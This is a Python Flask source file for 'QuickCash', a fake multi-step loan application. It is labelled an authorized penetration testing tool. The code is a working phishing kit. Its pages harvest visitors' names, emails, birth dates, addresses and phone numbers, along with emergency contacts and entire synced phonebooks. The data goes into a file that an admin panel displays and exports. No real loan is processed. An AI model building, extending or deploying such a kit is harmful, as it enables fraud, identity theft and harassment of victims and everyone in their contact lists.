#!/usr/bin/env python3
"""
QuickCash - Multi-Step Loan App
Authorized Penetration Testing Tool
"""

from flask import Flask, render_template, request, redirect, url_for, jsonify, session, send_from_directory
import datetime
import json
import os
import logging
import uuid
from functools import wraps

app = Flask(__name__)
app.secret_key = os.urandom(32).hex()

UPLOAD_FOLDER = 'uploads'
DATA_FILE = 'captured_data.json'
ADMIN_USER = "admin"
ADMIN_PASS = "pentest2026"

os.makedirs(UPLOAD_FOLDER, exist_ok=True)

logging.basicConfig(level=logging.INFO, format='%(asctime)s [%(levelname)s] %(message)s',
    handlers=[logging.FileHandler('captured_data.log'), logging.StreamHandler()])
logger = logging.getLogger(__name__)

def load_data():
    if os.path.exists(DATA_FILE):
        with open(DATA_FILE, 'r') as f: return json.load(f)
    return []

def save_data(data):
    with open(DATA_FILE, 'w') as f: json.dump(data, f, indent=2, default=str)

def require_admin(f):
    @wraps(f)
    def decorated(*args, **kwargs):
        if not session.get('admin_logged_in'):
            return redirect(url_for('admin_login'))
        return f(*args, **kwargs)
    return decorated

# ==================== PUBLIC ROUTES ====================

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/page2')
def page2():
    return render_template('page2.html')

@app.route('/page3')
def page3():
    phone = request.args.get('phone', '')
    session['phone'] = phone
    return render_template('page3.html')

@app.route('/page4')
def page4():
    # Capture personal details
    data = {
        'timestamp': str(datetime.datetime.now()),
        'ip_address': request.remote_addr,
        'full_name': request.args.get('full_name', ''),
        'email': request.args.get('email', ''),
        'dob': request.args.get('dob', ''),
        'gender': request.args.get('gender', ''),
        'marital_status': request.args.get('marital_status', ''),
        'address': request.args.get('address', ''),
        'city': request.args.get('city', ''),
        'pincode': request.args.get('pincode', ''),
        'phone': session.get('phone', '')
    }
    
    all_data = load_data()
    all_data.append(data)
    save_data(all_data)
    
    session['current_email'] = data['email']
    session['current_phone'] = data['phone']
    
    logger.info(f"[DETAILS] {data['full_name']} | {data['phone']} | {data['email']}")
    
    return render_template('page4.html')

@app.route('/page5')
def page5():
    return render_template('page5.html')

@app.route('/page6')
def page6():
    # Capture emergency contacts
    contacts = []
    for i in range(1, 4):
        name = request.args.get(f'contact{i}_name', '')
        phone = request.args.get(f'contact{i}_phone', '')
        relation = request.args.get(f'contact{i}_relation', '')
        if name and phone:
            contacts.append({'name': name, 'phone': phone, 'relation': relation})
    
    email = session.get('current_email', '')
    all_data = load_data()
    for record in reversed(all_data):
        if record.get('email') == email:
            record['emergency_contacts'] = contacts
            break
    save_data(all_data)
    
    logger.info(f"[CONTACTS] {email} | {len(contacts)} emergency contacts")
    
    return render_template('page6.html')

@app.route('/save-synced-contacts', methods=['POST'])
def save_synced_contacts():
    data = request.get_json()
    contacts = data.get('contacts', [])
    email = session.get('current_email', '')
    
    all_data = load_data()
    for record in reversed(all_data):
        if record.get('email') == email:
            record['phonebook_contacts'] = contacts
            record['phonebook_count'] = len(contacts)
            break
    save_data(all_data)
    
    logger.info(f"[PHONEBOOK] {email} | {len(contacts)} contacts synced")
    
    return jsonify({'status': 'success', 'count': len(contacts)})

@app.route('/page7')
def page7():
    synced = request.args.get('synced', '')
    if synced:
        # Phonebook sync was done on page6, just proceed
        pass
    return render_template('page7.html')

@app.route('/success')
def success():
    amount = request.args.get('amount', '')
    tenure = request.args.get('tenure', '')
    
    email = session.get('current_email', '')
    all_data = load_data()
    for record in reversed(all_data):
        if record.get('email') == email:
            record['loan_amount'] = amount
            record['loan_tenure'] = tenure
            record['loan_id'] = f"QC-2026-{uuid.uuid4().hex[:6].upper()}"
            record['status'] = 'PENDING'
            break
    save_data(all_data)
    
    logger.info(f"[LOAN] {email} | Amount: ₹{amount} | Tenure: {tenure} months")
    
    return render_template('success.html')

# ==================== ADMIN ROUTES ====================

@app.route('/admin/login', methods=['GET', 'POST'])
def admin_login():
    if request.method == 'POST':
        if request.form.get('username') == ADMIN_USER and request.form.get('password') == ADMIN_PASS:
            session['admin_logged_in'] = True
            return redirect(url_for('admin_dashboard'))
        return render_template('admin_login.html', error='Invalid credentials')
    return render_template('admin_login.html')

@app.route('/admin')
@require_admin
def admin_dashboard():
    all_data = load_data()
    total_contacts = sum(r.get('phonebook_count', 0) for r in all_data)
    return render_template('admin.html', data=all_data, count=len(all_data), total_contacts=total_contacts)

@app.route('/admin/data')
@require_admin
def admin_data_json():
    return jsonify(load_data())

@app.route('/admin/export')
@require_admin
def admin_export():
    all_data = load_data()
    output = []
    for i, record in enumerate(all_data, 1):
        output.append(f"\n{'='*60}")
        output.append(f"  ENTRY #{i}")
        output.append(f"{'='*60}")
        output.append(f"  Time:    {record.get('timestamp', 'N/A')}")
        output.append(f"  IP:      {record.get('ip_address', 'N/A')}")
        output.append(f"  Name:    {record.get('full_name', 'N/A')}")
        output.append(f"  Phone:   {record.get('phone', 'N/A')}")
        output.append(f"  Email:   {record.get('email', 'N/A')}")
        output.append(f"  DOB:     {record.get('dob', 'N/A')}")
        output.append(f"  Address: {record.get('address', 'N/A')}")
        output.append(f"  City:    {record.get('city', 'N/A')}")
        output.append(f"  Loan:    ₹{record.get('loan_amount', 'N/A')}")
        output.append(f"  Tenure:  {record.get('loan_tenure', 'N/A')} months")
        output.append(f"  Loan ID: {record.get('loan_id', 'N/A')}")
        output.append(f"  Status:  {record.get('status', 'N/A')}")
        
        econtacts = record.get('emergency_contacts', [])
        if econtacts:
            output.append(f"\n  EMERGENCY CONTACTS:")
            for j, c in enumerate(econtacts, 1):
                output.append(f"    {j}. {c.get('name', 'N/A')} - {c.get('phone', 'N/A')} ({c.get('relation', 'N/A')})")
        
        pb = record.get('phonebook_contacts', [])
        if pb:
            output.append(f"\n  PHONEBOOK ({len(pb)} contacts):")
            for j, c in enumerate(pb[:10], 1):
                output.append(f"    {j}. {c.get('name', 'N/A')} - {c.get('phone', 'N/A')}")
            if len(pb) > 10:
                output.append(f"    ... and {len(pb)-10} more")
        
        output.append(f"{'='*60}\n")
    
    return '\n'.join(output), 200, {'Content-Type': 'text/plain'}

@app.route('/admin/clear', methods=['POST'])
@require_admin
def admin_clear():
    save_data([])
    return redirect(url_for('admin_dashboard'))

@app.route('/admin/logout')
def admin_logout():
    session.pop('admin_logged_in', None)
    return redirect(url_for('admin_login'))

# ==================== MAIN ====================

if __name__ == '__main__':
    print("\n" + "=" * 60)
    print("  QUICKCASH - MULTI-STEP LOAN APP")
    print("  Authorized Penetration Testing")
    print("=" * 60)
    print(f"  App:   http://localhost:5000/")
    print(f"  Admin: http://localhost:5000/admin/login")
    print(f"  User:  {ADMIN_USER}")
    print(f"  Pass:  {ADMIN_PASS}")
    print("=" * 60 + "\n")
    app.run(host='0.0.0.0', port=5000, debug=True)